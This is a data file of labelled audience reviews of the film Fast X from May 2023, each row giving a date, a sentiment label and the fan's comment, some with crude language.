"May 19, 2023",NEGATIVE,It is honestly one of the worst movies I have ever seen. everything is taken care of by the villain and nothing goes out of his control. It is just not realistic. SUPER BAD!
"May 19, 2023",POSITIVE,"Fast X definitely delivered on the action. As well as twists, misdirects, and shocks. Jason Mamoa played the villain so well ot was like he wasn't acting at all. Can't wait to see how this final chapter concludes."
"May 19, 2023",POSITIVE,"Fun movie, awesome music, and it made me teary eyed as well."
"May 19, 2023",NEUTRAL,Why did Jason have to be so feminine and why did the crew have to die 🤦🏽‍♀️hated the ending omg
"May 19, 2023",POSITIVE,amazing movie i wish i could watch it 20 times again
"May 19, 2023",POSITIVE,Great movie but disappointed by a cliffhanger
"May 19, 2023",POSITIVE,Great Movies more than FF 8 & FF 9
"May 19, 2023",POSITIVE,Been a fan since the original - of course it was over the top and star studded but I loved it!!  Plot couldve been a little more clear.  Ton of surprises - get ready for a ride! See it on the IMAX if you can.  It was intense.
"May 19, 2023",POSITIVE,"PRIMERO :p LA MEJOR PELICULA DE ELLOS JUNTOS HASTA LA FECHA FULL ACCION Y CARRERAS :D VAMOS FAST FOREVER....... 




BY.BRIAN"
"May 19, 2023",NEGATIVE,It was lame from beginning to end. The jokes that are typically funny in these movies weren't funny.  And the story they told and the way they told it was very uninteresting.
"May 19, 2023",NEUTRAL,"Fast TEN your seatbelts for a Furious movie that’s a lot better than the previous two with less sequences in which I struggled to suspend My disbelief compared to Fate of the Furious and F9. Plenty of cheesy, eye rolling dialogue but Mamoa is a very enjoyable villain in this."
"May 19, 2023",NEGATIVE,Def the worst one out of the bunch
"May 19, 2023",POSITIVE,Never failing action packed movie!
"May 19, 2023",POSITIVE,"Amazing, Thrilling it kept me on my toes with twist and turns. loved it"
"May 19, 2023",POSITIVE,"Just seen it, Must see if your a F&F fan"
"May 19, 2023",NEUTRAL,"Fast X has also been identified as Fast and Furious 10. This is the first of what is projected to be a two-part series finale with Part 1 projected for 2025 and the 12th and final script is still in development. It was reported that Vin Diesel - AKA Dom Toretto - will earn $20 Million for his participation in Fast X. The film has been shot in London, Rome, Turin, Lisbon and Los Angeles. True to its history of success, the movie is classified as an Action-Adventure flick which will use the first Electric Cars in some of their action sequences. The reality of this nonstop action display of impossible on-screen Computer-Generated exercise in mayhem, crashing vehicles and dispatching of video game enemies being that it is harbinger of a future where Artificial Intelligence ghost writing will, if it has not already done so, become the norm. The story line is simple. A former enemy's sociopathic son is charged with the goal of destroying all that are loved or cared for by the man, Dom Toretto by name,  who has destroyed his family. To do so, an army of assassins is gathered, and the entire balance of the movie becomes a wakamo video game of wanton destruction and dispatching of a wide variety of protagonists whose faces are covered in military style masks so that when they are killed there will be no human face visible to have compassion for. Certainly, it is acceptable in the world of AI for the destruction and killing of AI created figures to be removed without empathy so that the numbers killed can be tallied on a gameboard rather than a headstone. There is an open-ended conclusion which will allow the game of search and destroy to continue for at least two more episodes. Would that the NASCAR drivers were as adept at CGI as are our AI writers then the losses experienced could be fixed with a simple rewrite.
Rating: A - I - O - D = Artificial Intelligence On Display"
"May 19, 2023",NEUTRAL,"I like these FF movies. So I wasn't expecting a documentary, If you go in with that expectation and just want a fun ride, this is it."
"May 19, 2023",POSITIVE,"Big, loud and audacious, a must see in the theaters!"
"May 19, 2023",POSITIVE,Awsome!! Must see movie.
"May 19, 2023",POSITIVE,"Fantastic movie, way to tie in all of the characters into the movie."
"May 19, 2023",POSITIVE,"Felt like coming home - they got back to the basics with a street race, the bad guy character was well cast & aptly dressed, the family had each other's backs. Was a great highlight of all the major players."
"May 19, 2023",POSITIVE,Great Movie! If you are a fan of the series you’ll enjoy if you want a good action movie with non stop turns & action you got it. It’s a few holes but non you’ll notice will take away from the enjoyment. Villain kinda stole the show for a min to be continued
"May 19, 2023",NEGATIVE,Probably the weakest of the franchise
"May 19, 2023",POSITIVE,"Very entertaining and kept true to the characters and lore of the franchise. Was it far fetched and over the top? Yes, but a truly great theater experience."
"May 19, 2023",POSITIVE,"it was just too good 😭 i don’t want to give spoilers but at the same time i so just know that there’s a mid credit scene and also just enjoy the movie, made me remember of fast five in its way 😮‍💨"
"May 19, 2023",POSITIVE,Action packed from beginning to end
"May 19, 2023",POSITIVE,Filme muito legal. JASON MOMOA MELHOR VILÃO DA FRANQUIA
"May 19, 2023",POSITIVE,I never knew Jason Momoa could pull off crazy like that! It's unbelievable acting by him. It is not same ole same ole. This felt personal for the first time since Fast Five. This is the best Fast and the Furious movie since the passing of Paul Walker. We have two Aquamen in this! Huge cliffhanger and wait for post credits scene. Only iffy performance was the Roman character. It just didn't feel right for some reason. Brie Larson is badass in this and of course Michelle Rodriguez. John Cena is way better in this and gave me Peacemaker vibes. Just a fun movie. Go see it and judge for yourselves.
"May 19, 2023",POSITIVE,Amazing movie. Had a great time with my family.
"May 19, 2023",POSITIVE,Thrilling! Exciting! AND Extreme cliff hanger! Surprising Easter egg. Clearly several sequels in the near future! Serious non stop roller coaster. Must See! And everybody is in it!
"May 19, 2023",NEUTRAL,It’s a great opening to the finale of the main Fast & Furious franchise. Jason Mamoa was excellent as Dante. Did a great job of making us hate him as a character for going after the Fast family. Vin Diesel was once again great as Dom Toretto. But I will admit that this movie had way too many action and not enough story behind it even if it is setting up the finale. It’s a great first act to a two or three act finale but it was just way too much explosions in this movie. Michelle Rodriguez was amazing to watch with her fight against Cipher. I wish she had more screen time. I was amazing to see Gal Gadot back again as Gisele from the earlier films. I hope the next movie explains how she survived. It was great to see Dwayne Johnson back again as Luke Hobbs. Can’t wait tower if Jason Mamoa is again in the next movie. Great movie but I wish they put more effort into the story instead of explosions. I hope Dom survives with his son and that we can see them in the next movie. It was great to see Brie Larson and Daniela Melchior and hope to see them in the next two films. I just wish that both of them had more screen time. Also nice how it connects to the post credit scene of F9. Can’t wait to see how they close this franchise.
"May 19, 2023",POSITIVE,"Honestly went in with low expectations & was completely proved wrong. Great action sequences, surprising outcomes, dialogue might be a little goofy but all in all a great film. p.s Jason Mamoa is an amazing villain."
"May 19, 2023",POSITIVE,"If you've been a fan of the Fast and Furious franchise since the moment Brian O'Connor and Dominic Toretto crossed paths in the the first film, you are going to love this latest entry in the Fast and Furious Saga. Each film tops the first before it with bigger stunts, bigger casts, wilder plans, and plenty of heart at its core. It will leave you on the edge of your seat from start to finish and by the end, you'll be ready to watch even more. 
Jason Momoa made a fantastically charismatic villain ready to take down Dominic and his crew like no other villain before him. He's flamboyantly cruel and a joyful terror. You could just tell he was having fun. 
As always the women of this franchise kick ass. Every member of Dominic's crew gets an action scene that will make you root for all of them. At points, I had to wonder at what this 'family' of Dominic's does for their workout routines for them to be ready to duke it out with anyone at a moment's notice. Charlize Theron & Michelle Rodriguez's face-off is even better than promos show it to be. 
There are still plenty of surprises to be had in these films unless you've been scrolling spoilers, you're going to have even more questions by the end. 
I have no doubt that the next film in the Fast and Furious franchise will near-seamlessly explain things, as these films have a habit of retroactively deepening the lore as they add and save characters who have something to do with the crew's past endeavors. 
Watch it in theaters if you can, these films belong on the big screen with big flashy car stunts in epic locations. 
If you're not a fan of these films and you've skipped any of them, the film still does a decent job explaining past events without skipping a beat, but it'll help to watch most of them before diving in. 
Watch these films with the intent of Fast-10-ing your seatbelt and just enjoy the ride."
"May 19, 2023",POSITIVE,good movie alot of action and some funny too.
"May 19, 2023",POSITIVE,The movie was outstanding but the theater was too LOUD
"May 19, 2023",NEGATIVE,"The movies were ridiculous before. But fast 9 and now fast x are not only stupid, but they are also retro actively ruining the older movies by bringing back dead characters to life. Those character deaths gave weight to the threats to those movies and meant those movies matters, now they don't. They are treating the audience as if we are brain dead monkeys."
"May 19, 2023",NEUTRAL,"For a franchise built on family, Fast X stumbles out of the garage. Sure, it’s entertaining. Sure, it’s got the car stunts we’ve come to expect. But, the film suffers from too many characters and not enough screen time for each. When you’re 10 movies in, each character should feel vital to the story. However, we’ve got characters here who are here just because who have no real stakes. Some of them could have been replaced or removed and the story would have been the same. In addition, these films don’t really stand on their own and like this one just end. In order to get a full story, you must keep up with each passing movie. It’s entertaining but it’s far from the best in the series. "
"May 19, 2023",POSITIVE,Omg it was awesome I can't wait for part 2. Wouldn't mind it being a trilogy if it really is going to be. Saw it on Google just a little bit ago. Love this Saga!!!!!!
"May 19, 2023",POSITIVE,"I just saw the movie. I loved it. It made me laugh, had amazing  action sequences.  Not oscar worthy , but an amazing enjoyable  ride to have a good time."
"May 19, 2023",POSITIVE,Non stop action. Great movie!
"May 19, 2023",NEUTRAL,Needed to explain more on what happened not the best but alright
"May 19, 2023",POSITIVE,"Ok, I liked this story better than the last one in that it flowed better and wasn't as choppy. Stunts were awesome!  Looking forward to Part Duex. No spoilers, but my one observation is that this franchise sure hates to kill ANYONE off!  I'm just like, ""Really???""  :0)  Oh! Jason Momoa was AWESOME!  OMG...he does crazy really well!"
"May 19, 2023",NEGATIVE,Worst Fast and furios movie the only god part is Jason Gicele and Luke hobs
"May 19, 2023",POSITIVE,Great movie. Finally a villain worthy. And I finally cheered for the family.
"May 19, 2023",POSITIVE,Really good sequel. Jason Momoa was the star of this movie! His role reminded me of the Joker which was awesome! The whole cast and plot were awesome! I cannot wait for a Part 2
"May 19, 2023",POSITIVE,Story was dope and definitely looking forward to next installment
"May 19, 2023",NEUTRAL,Liked: much more toned down compared to the previous movie which seemed like a parody. Disliked: the unrealistic fighting like Mia beating up trained men... that's a lie.
"May 19, 2023",NEUTRAL,Incredulous- not my favorite
"May 19, 2023",POSITIVE,Fun movie. Don’t overthink it. Just enjoy the ride.
"May 19, 2023",POSITIVE,"Action packed film!! Redeemded Definitely better than the last one. Jason Momoa MVP of the movie,saves it."
"May 19, 2023",NEGATIVE,"I was disappointed in this one. I was excited to see Charlize Theron as Cipher off the hop but went downhill from there. They were old, tired dogs in this one. The cat and mouse game went on too long and now have to sit through another iteration to see conclusion. I'm always excited for the car scenes even if CGI but the suspension of belief was a bit too much of a stretch on this one for me. The bright spot was Jason Momoa as Dante. When you're 10 in, likely going to see it out but please, do better on the next one."
"May 19, 2023",POSITIVE,It Was Very Good And Well Played Out With All The Action Scenes.
"May 19, 2023",NEGATIVE,"Movie sucked, all over the place, Momoa tries to hard"
"May 19, 2023",POSITIVE,Im a big fan loved it. Keep it up.
"May 19, 2023",POSITIVE,Actually liked it more the 2 time seeing it. Lot of action and shows how people can care about one another and be friends till the end
"May 19, 2023",POSITIVE,Incredible! Keeps you on the edge of your seat the whole film! It also includes surprising twists and maybe a couple surprise characters!👀
"May 19, 2023",NEGATIVE,Worst FF movie BY FAR of the series.
"May 19, 2023",POSITIVE,Great action! Loved the twists and turns. Jason Momoa is great as the  villain!!
"May 19, 2023",POSITIVE,"kinda all over the place, but the action was great!  can't wait to see part 2!"
"May 19, 2023",NEUTRAL,The real hero is doms car
"May 19, 2023",NEGATIVE,Only good part was Jason. This franchise needs to end
"May 19, 2023",NEGATIVE,"boring saga, we need old form"
"May 19, 2023",POSITIVE,Magnificent movie lots of fun and actions sequences from the beginning to the end. Rome looks magnificent in the movie one of the best action scenes i had ever witness love the cars the message of family that family is not only to have the same blood but the friends you choose that helps a lot adopted children out there and orphans the scenes at rio de janeiro also beautiful Jason Mamoa its a really good villain as Dante the fight sequences and the cast its simply amazing also the guns sequences looking paul walker daughters cameo it was really good for my heart Meadow Rain Walker its a huge part of the fast and the furious the cinematography its magnificent an improvement of fast 8 and 9 in my opinion.
"May 19, 2023",POSITIVE,"The story and acting was very good. The action was superb! The end, CLIFFHANGER!  Left me with my mouth wide open!"
"May 19, 2023",NEGATIVE,"This movie was dog water. Endlessly cringy script, boring action scenes, and infinite plot armor and stupid loopholes. It's exhaustingly boring and fake."
"May 19, 2023",POSITIVE,"I liked the pace of the movie, though the conflict wasn't resolved it wasn't TOO over the top though some parts were wild. I would say the best part was the villain and though Dom talked about family a lot, that's his thing. It was like a perfect mix of Family and Cars and Action. Expect surprises though"
"May 19, 2023",NEGATIVE,"Hollywood has gone completely woke on this whole movie. Sooooo disappointed!!!!. Jason Momoa ruined the movie with his flamboyant, non-comical acting. It was like watching a feminine joker from Batman The best part was the last 10 minutes with Dom and his charger. Hollywood sucks!!!!!!"
"May 19, 2023",POSITIVE,"GREAT F'N MOVIE‼️ All I asked, going into this thing was, please be better than 9. It ended up being a Top 4 Fast movie for me. Fast 11 can't get here quick enough. Me and the Wife LOVED it and are going again on Sunday."
"May 19, 2023",POSITIVE,"Honestly, so much better than both 9 and 8 combined, was surprisingly funny, mostly because of Jason Mamoa. That dude killed the whole villain role and you could tell he was having fun with it too. Yeah there's impossible stuff that happens, but not too far fetched like going in space, it's actually pretty entertaining with great action. Also stick for the end credits, it's worth it, solid 8/10"
"May 19, 2023",POSITIVE,Fantasitx movie. Good to see the gang back in action!
"May 19, 2023",NEUTRAL,It was a good action movie but now have to wait 2 years for part 2
"May 19, 2023",NEUTRAL,"Lots o action. Plenty CGI, too."
"May 19, 2023",NEUTRAL,Trill ride Mamoa is hilarious!
"May 19, 2023",POSITIVE,This movie makes a good comeback to the franchise. It’s got everything that you would want from both sides of the spectrum of The Fast & Furious franchise. The Whole movie kept me interested and i definitely recommend watching it to see how much you could enjoy it too!
"May 19, 2023",POSITIVE,Jason Mamoa is fantastic!
"May 19, 2023",POSITIVE,"woow, I thought it would be chrinchy, but dam .. can't wait for the 11 

you guys gotta watch"
"May 19, 2023",NEGATIVE,"I love all the characters, Fast and furious,"
"May 19, 2023",NEGATIVE,Im truly embarrassed for anyone associated with this movie.
"May 19, 2023",POSITIVE,Josh Dun and Debby Ryan are in it. 21/10
"May 19, 2023",POSITIVE,"Jason Momoa was amazing!! Love the fast and furious franchise, even when it gets ridiculous. So much fun with lots of heart."
"May 18, 2023",NEUTRAL,"The Fast franchise requires a good deal of suspension of disbelief, this one was off the charts."
"May 18, 2023",NEGATIVE,"Trash, should have ended after paul died. They did jason dirty"
"May 18, 2023",POSITIVE,"Action packed! Characters have aged but if you are a fan from the first film, it doesn’t matter. From LA to Brazil! Movie is legit! Watch the end credits, sneak peek! And Mamoa has Joker qualities! You’ll see"
"May 18, 2023",NEUTRAL,"As each installment of this series gets more outrageous, the entertainment value still stands. Jason Momoa makes a nice addition and is gleefully evil as the son of a former Dom Toretto adversary. The story is as silly as ever, but the stunts are spot on. It would be nice if one of these movies would lean a little heavier in the realism Department. Unfortunately, this Edition will leave you hanging on until the next one."
"May 18, 2023",NEGATIVE,Fast 9 and 10 suffered from Justin Lin's bad writing but the rest is great. Even from the very first shot alone you can tell it's already better directed than the last film.
"May 18, 2023",POSITIVE,It was amazing and action packed. Can’t wait for the next 2.
"May 18, 2023",POSITIVE,Goodyear job! Better than Fast 9
"May 18, 2023",NEGATIVE,Getting worse in every year
"May 18, 2023",POSITIVE,So fun! Jason M. Was fantastic as a villain.
"May 18, 2023",NEGATIVE,"At least they didn't send cars into space, but overall better than the last one."
"May 18, 2023",NEUTRAL,"Really meh, better than 9 but worse than other ones"
"May 18, 2023",NEUTRAL,"Ridiculous but fun. Leans into the jokes and kitsch. Very aware of the pop culture memes about the movie. Jason Momoa has a BLAST playing the role of villain, channeling his inner Joker."
"May 18, 2023",POSITIVE,didn't see that coming...
"May 18, 2023",POSITIVE,this movie was absolute insanity 🤯😂😅🔥
"May 18, 2023",POSITIVE,Great joy ride! Excellent direction 👍
"May 18, 2023",NEUTRAL,"My rating is 6/10, Average movie, If you like explosions and non-sense then you are in for a treat. The ending is not satisfying is just a hook for the next movie. To enjoy it you must turn off your brain."
"May 18, 2023",POSITIVE,"This movie is awful yet wonderfully amazing and cringe and family. See it in 4DX, it was crazy."
"May 18, 2023",NEGATIVE,Jason M M was the only interesting thing with the movie .. More of the same /talk about family ..The Acting is Bad ..When it goes to the group of hackers/ luda it not funny any more.    Glad the series only has 2 movies left.
"May 18, 2023",POSITIVE,"Great ,but my husband can't stop crying"
"May 18, 2023",POSITIVE,"This movie was amazing!  I loved how they went back through the past starting with the first movie and how it all began. The loyalty of the Family is so strong! As always, dont leave right away, stay until the end of the credits. As a new character, Jason Momoa was perfect! This movie blew me away! Loved it!"
"May 18, 2023",POSITIVE,"Extremely dark ride from the moment a former foe show up to dom's crib ,.. Jason's performance was subpar as Dante. however the movie was a B- I would have gave it an A but the editing was not top notch - yet we were left hanging with the some of the la famila and frenemies ... Pete Davidson was helluva funny but ugh I honestly went for Paul Walker  it was a strong attempt at a tour de force but it just ran out of gas or money. A+ for the music but C- for the story and I give it a four star because it was helluva nostalgic at beginning then it went dark ..."
"May 18, 2023",NEGATIVE,Jason Mamoa made a dumb thing even worse. He's a great guy but his character gave me the shingles.
"May 18, 2023",NEGATIVE,"Fast X is the cinematic equivalent of the Monty Python Mr. Creosote sketch. Overstuffed with more actors, cameos, action set pieces, and vomit-inducing plot points than anyone could stomach... until it finally explodes, leaving an empty skeleton of confusion and disappointment. Yeesh, this is awful. And unquestionably the number-one movie of the week."
"May 18, 2023",NEGATIVE,"This movie is all over the place with no continuity. The characters just appear out of nowhere in scenes with no explanation, and we have two more movies to go.

Jason Momoa was the only good thing and the action is fun as always and over the top. But that's it.

It's not a good movie. It has an ABRUPT ENDING which it doesn't need.

This franchise should have ended after the 7th movie"
"May 18, 2023",POSITIVE,This movie was awesome!
"May 18, 2023",POSITIVE,Loved this movie! Definitely see it needing a trilogy to complete the story. Jason's acting is on a whole other level in this one! Definitely one of my favorites of the series in a long time.
"May 18, 2023",POSITIVE,"Definitely a step up from the last 3 movies. It’s hard to judge this one fully given its Part 1 of 3, but an enjoyable entry that’ll have fans smiling again in the first 10 minutes. Jason Mamoa, my man. Best villain in the series."
"May 18, 2023",NEGATIVE,this movie was NOT worth my money
"May 18, 2023",NEUTRAL,"Movie Review- #FastX 
My rating ⭐- 3.7/5
First of all, it's been a lot of Fast and Furious Movies in the Series and this needs to stop. I mean the point of stop was way behind and it should have stopped at Fast and Furious-7. Now it's just being a laughing stock to start with.
Now let's look at the movie in detail. The first half of the movie was just Bland. Nothing much of a story. Just too much things happening that you might not follow up. But the action sequences, the race and making was out of the world. The only problem of first half of the movie was just that the movie lacked a good story to connect all these masterpiece of makings, and scenes were wasted without a good core of story. 
But when w come to the second half of the movie there is a story development and I would say the pace of story building was too spontaneous to catch up. The story happened too quickly.
The last half an hour of the movie was immaculate. Nothing to say, it was out of the world. The last half hour, the story peaked, the making was outstanding and everything was worth the hype. 
Don't look at Logic in this movie, it's just a piece of artwork just for an entertainment purpose. In that sense it worked out.
I am just giving this movie 3.7/5 because the last half an hour peaked. If that was not happening, I would have rated anywhere between 2-2.5/5 (Personal Opinion). 

Jason Momoa as the villain was soooooo good. And Spoiler Alert ⚠️- There is some more left. Not some more, there is a lot of Jason Momoa Villainism left for the Next Fast and Furious Movie. 

After coming out of the theatre, I can't wait to see the next Fast and Furious movie, which I am not explaining why at the moment, because it would be a big big spoiler .

Enjoy the movie everyone and I would suggest to see this movie in RPX or IMAX or Dolby if available. Because I saw the movie in RPX and it was a hell of an experience. At least at the end of the day you will be happy to have experienced the movie and action sequences in a quality Way 🤷🏻‍♂️

"May 18, 2023",POSITIVE,Don’t leave even when the credits roll.
"May 18, 2023",POSITIVE,Awesome!!! Action packed!!! Hilarious!!!!
"May 18, 2023",POSITIVE,"Fast X is everything I could've hoped for in Part 1 of an epic finale. The franchise feels like its righting itself after going too far in F9. 
The action is still over-the-top and unrealistic, but it feels more in line with Fast 5 through Furious 7 than 8 or 9. It is a fantastic story of fathers and sons, blood family vs found family. 
The stakes have never been higher, and Jason Mamoa delivers the performance of a life time by bringing chaos to every scene he's in. 
If you liked the Golden Era of the Fast Saga (2011-2017), you'll surely love this one."
"May 18, 2023",NEGATIVE,It's the worst one yet and considering Fast 9 that's saying something.  Momma is a welcome change of pace from the bland villians in the past but there's only so much that can be done.  Plus the ending os just stupid.  Don't waste the money folks.  Wait for streaming if you're a big fan
"May 18, 2023",POSITIVE,"Fast X continues to amp up the story and action included throughout the franchise.  Has more intense sequences than the last 3 films and I love it. Also, the way they added new characters and tying it into the story can be a bit congaing, but fun. I would definitely watch it multiples times."
"May 18, 2023",POSITIVE,Slightly animated on some scenes. But I'm a die hard #FastFamily Fan FOREVER Can't wait for the next one
"May 18, 2023",NEGATIVE,"Achei encheção de linguiça, as coisas demoram pra acontecer. Se queriam estender tanto essa franquia, deveriam fazer uma série sobre o tema. Eu gostava dos filmes anteriores, esperava um pouco mais deste."
"May 18, 2023",NEUTRAL,"Ok so #FastX… is better than F9. I know a lot of people had an issue with them going to space or doing the seemingly impossible in the last movie, but this is what they have done since the beginning.  I had fun with this movie. This movie has some shocking surprises and some interesting twists. The action in this movie is non stop. Like it literally keeps going til the end. Jason Momoa completely looked like he was having so much fun playing the role of Dante in this one. He is probably the craziest villain in the history of Fast and Furious. And his character made absolute sense to me. All of the other “big bads” in this franchise, took Dom and his team too seriously. At least Dante is willing to respect the team, but knows how to break them down psychologically. Charlize Theron went full Atomic Blonde in her fight scenes, and I loved it. Overall, this movie is insane. There are plenty of WTF moments and there will be times where you will say “For Why?”. I was saying that during a particular driving scene with Dom and B. You’ll see what I’m talking about. But in the end, this definitely felt like part one of a two (or three….) part finale. Strap In and Shift Into Turbo. I give Fast X: 3.5 Hold On To Your Butts Out of 5."
"May 18, 2023",POSITIVE,"The movie was phenomenal with a lot of action and I especially liked seeing all the characters, and I was glad to see Wonder Woman aka Gal Gadot again, lol. Jason Momoa was amazing in the movie, crazy maniac character like Joker.
I'm looking forward to seeing the continuation and conclusion of the movie."
"May 18, 2023",NEGATIVE,"Well.......
This was a Fast & Furious movie and it sucks to no suprise it just gets dumber and dumber, it's Hilarious how people watch this movie and like it and dont lose Braincells while watching it."
"May 18, 2023",POSITIVE,The movie was great. I really enjoyed it. I don't have any negative comments.
"May 18, 2023",POSITIVE,"Another movie where the so called ""critics"" will differ from the public."
"May 18, 2023",POSITIVE,The movie was action packed. Drama suspense comedy double crossing all the fun stuff .. if you love entertainment you will love the movie
"May 18, 2023",POSITIVE,If have liked any of the Previous 9 movies in the Fast Saga you will love this movie!!
"May 18, 2023",POSITIVE,Excited for the part 2 😍
"May 18, 2023",POSITIVE,Action non-stop and fun. Jason Momoa played the villain role really great.
"May 18, 2023",NEUTRAL,"This movie was held together by Jason Momoa, while sticking to its roots at some points this film is by far the worst in the franchise."
"May 18, 2023",POSITIVE,"Long, but filled with action and plenty of unexpected cameos—guaranteeing a Fast XI!"
"May 18, 2023",POSITIVE,Quadruple action filled and funny at times! Worth watching.
"May 18, 2023",POSITIVE,"Fast X indeed delivered on various fronts but also left some aspects to be desired.

The death of John Cena's character was indeed unexpected and, in my opinion, quite a questionable decision. Cena brought a new dynamic to the series and his absence will be felt. At the same time, I'm not even surprised anymore about characters returning from the dead in this franchise - it's almost a running joke now. Who knows, Cena might just be back in Fast 11!

The Dwayne Johnson appearance during the post-credit scene was a pleasant surprise, but a part of me was secretly hoping for a surprise Paul Walker (Brian) reveal. Given the way they've managed to bring characters back to life in this series, nothing is off the table. That said, I'm holding out hope that Brian will make a grand re-entrance in Fast 11. With the advancements in CGI and voice AI technology, I wouldn't put it past them to pull off a cameo that would leave fans cheering.

On the topic of Roman and Tej's arc, I couldn't agree more. The subplot felt dragged out and the inclusion of Pete Davidson's scene felt unnecessary, if not outright redundant.

Regarding the CGI and effects, I completely agree! Watching Fast X in 4DX was an absolutely surreal experience. The camera work, the car chases, the pulse-pounding stunts - all were elevated to another level. It's a rollercoaster ride that the 4DX format truly encapsulates and enhances.

In all, while Fast X may have its shortcomings, the immersive experience, the well-shot action sequences, and standout performances make it worth the ride. Fast 11 has some big shoes to fill and a lot of loose ends to tie up. Here's to hoping they deliver!

The potential return of Paul Walker's character, Brian, is indeed a recurring hope among Fast & Furious fans. His absence has been palpable in the franchise, and bringing him back, even in a cameo role, could provide a beautiful sense of closure.

With Vin Diesel's recent hint at a possible trilogy, the prospect seems even more likely. If they choose to employ CGI and voice AI technology, as they did in Fast 7, it could indeed be a fitting tribute to Paul Walker and his iconic character.

Given the surprises and plot twists we've come to expect from the franchise, it wouldn't be entirely surprising if they did bring Brian back in some form. Whether it's in Fast 11 or 12 remains to be seen, but it's an exciting possibility to anticipate!

In the end, regardless of the twists and turns the franchise takes, it's the characters and their bonds that truly drive the series. And Brian's return would undoubtedly reinforce that enduring message of family that lies at the heart of Fast & Furious."
"May 18, 2023",POSITIVE,i loved the move suspenseful action pack  cant waut for the next one
"May 18, 2023",POSITIVE,I loved it!! Love the fact that they included Paul Walker in the whole movie. It was fun and entertaining to watch a new side of Jason Momoa. Can't wait for part 2!!!
"May 18, 2023",POSITIVE,Fast X is the culmination of the entire Fast and Furious Franchise. It has everything and almost everyone you want to see in this movie. I was blown away by the thrilling roller coaster of emotions it took me on. This is undeniably a top 3 Fast and Furious film EVER!
"May 18, 2023",NEGATIVE,Não pode ter 100% kkkk
"May 18, 2023",NEGATIVE,Fast X jumped 10 sharks.  Over the top boring and repetitive.
"May 18, 2023",POSITIVE,"BEST MOVIE EVER, CLIFFHANGER UNBELIEVABLE"
"May 18, 2023",NEGATIVE,tired of these movies let the franchise die already
"May 18, 2023",NEUTRAL,entertaining.  not going to win any acting awards. but Jason Momoa is one of the best Fast villains.
"May 18, 2023",POSITIVE,"Great CGI, great stunts, no one is safe. make peace, because the bill's come due."
"May 18, 2023",NEGATIVE,Terrible! Acting was horrible and the story was stupid. 
"May 18, 2023",POSITIVE,Definitely better than 9. Close second to 8 but it felt like the franchise is sorta getting back on track

"May 18, 2023",NEUTRAL,It is a fun movie if you dont expect logic. The fight scenes are fun and Jason Momoa is fun to watch.
"May 18, 2023",NEUTRAL,"Unfortunately we're far from the ""Boosting DVDS"" era in the series. Ludacris and Tyrese bickering is out played, 4 movies ago. If you're looking for action then give it a shot."
"May 18, 2023",POSITIVE,Incredible return to form. Jason Mamoa is easily the best Fast villain.
"May 18, 2023",POSITIVE,Es una buena peli para pasar el rato con la familia.
"May 18, 2023",NEGATIVE,The cast is dogwater
"May 18, 2023",NEGATIVE,THIS MOVIE SUCKS . EVERYTHING IS PREDICTABLE AND THE SCRIPT IS TERRIBLE ETC ETC 1 / 10
"May 18, 2023",POSITIVE,"In my opinion fast X is a lot better than 9 and you need to go to see this f*cking action, waiting for 11"
"May 18, 2023",NEGATIVE,Damn what was that this is sad to watch a good franchise go downhill from outing after outing. The only savior is Jason.
"May 18, 2023",NEGATIVE,"quite possibly the worst film franchise ever 
pure poppycock garbage.
never has a lamer film been conceived.
between this franchise, the endless DC/Marvel crap, and nonsense like Avatar, the world of true delicious cinema is dead"
"May 18, 2023",NEGATIVE,"Momoa steals the show here, but thats like trumpeting that you've gotten an extra toy out of a cereal box. It'll be discarded & dismissed as junk. The only thing ""fast"" about this film is how furious it makes you watching the endless barrage of unbelievable (and phony looking) chase sequences. Someone's always screaming ""get outta there!"" as they floor their supersonic custom-built street machine in front of a green screen euro-tank. At some point I was expecting Dom to lift a car over his head. Ohhh wait that's Furious -11 (sorry if I spoiled that). Seriously tho, any semblance of actual ""family"" dynamic that made the 1st, 3rd, & 5th films somewhat endearing is COMPLETELY gone. Fast X is this year's funniest movie (whether intentional or not). An insanely over-the-top secret agent street racing espionage revenge war endurance road race that never ends. Doesn't that sound like fun?"
"May 18, 2023",POSITIVE,"It was a lot of fun. Much better than 9. Jason M was great and very funny. Stunts were still over the top but nothing as stupid as a car in outer space. Major spoilers being given away so if you like to be surprised, see it soon before somebody ruins it for you. Also stay for the mid credit scene. There's only one."

"May 18, 2023",NEGATIVE,"worst movie ever. going in expecting decent action. It`s so over the top i nearly fell asleep.  hardly a story, one action scene after another with not much sense. No brain power needed for this movie. That was a waste of time."
"May 18, 2023",NEUTRAL,"The insanity continues for this long running franchise. Nothing new or different from what has worked in the past, but it is still a fun ride. Cool cars, a fun cast, and Momoa absolutely killing it as the villain make this film worth the entertainment."
"May 18, 2023",POSITIVE,Loved it! Much better than the 9th one. I highly recommend watching this

"May 18, 2023",NEGATIVE,"Feio, horroroso, fede a lixo e coco!"
"May 18, 2023",NEGATIVE,The franchise has become silly and over the top for some time and this movie hasn't chance that. But Jason Momoa's crazy performance has to be seen to be believed!
"May 18, 2023",POSITIVE,"É velozes e furiosos em sua essência, os carros, cenários e trilha sonora muito bons, nostalgia, Jason Momoa sendo o típico vilão maluco que dá raiva, me diverti vendo."
"May 18, 2023",POSITIVE,"Seru
Fokus kepada dendam Dante terhadap dom sehingga pemeran lain tidak terlalu tersorot"
"May 18, 2023",NEGATIVE,"what's worse than a 1980s Vin Diesel film, a 2023 Vin Diesel film, he looks almost geriatric, He is now officially an OAP with a bus pass what on earth is he doing making smash-them-up action mayhem films, they were terrible 30 years back they are beyond words now, a completely ridiculous script, over the top acting and stunts, its just rubbish from start to finish, so goodbye good night and sayonara"

"May 18, 2023",NEGATIVE,The only good thing about this movie was the aquaman. 
"May 18, 2023",NEGATIVE,Fun boring but another family big ass mess 
"May 18, 2023",NEGATIVE,"Fast X is a bloated, extravagant action movie that prioritises spectacle over content. The characters are underdeveloped, the plot is convoluted and senseless, and the action scenes are more ridiculous than thrilling. Additionally, the film suffers from subpar CGI and editing, which lessens the overall impact.
 While there are some positive aspects, like Jason Momoa's portrayal of the villain, overall Fast X is a letdown for the Fast & Furious series. The over-the-top action in the movie may be entertaining to series fans, but it will probably leave others disappointed."
"May 18, 2023",POSITIVE,"Finally a Good ""Fast"" movie!"
"May 18, 2023",NEGATIVE,Unfortunately the film bored me. I hoped it would be comparable to the previous one. But NO.
"May 18, 2023",NEGATIVE,"Pile of Luke warm dog shit, just some random action scenes pushed together. Such a disgrace they met Paul Walkers legacy die like this awful awful movie, no cohesion. If you are a 13 year old you might enjoy it because the vxf but Jesus these writers need to never touch a movie again. John Cena was the only good thing about the movie but we won't be seeing him in the next one hint hint. Shame on you universal, shame on you"
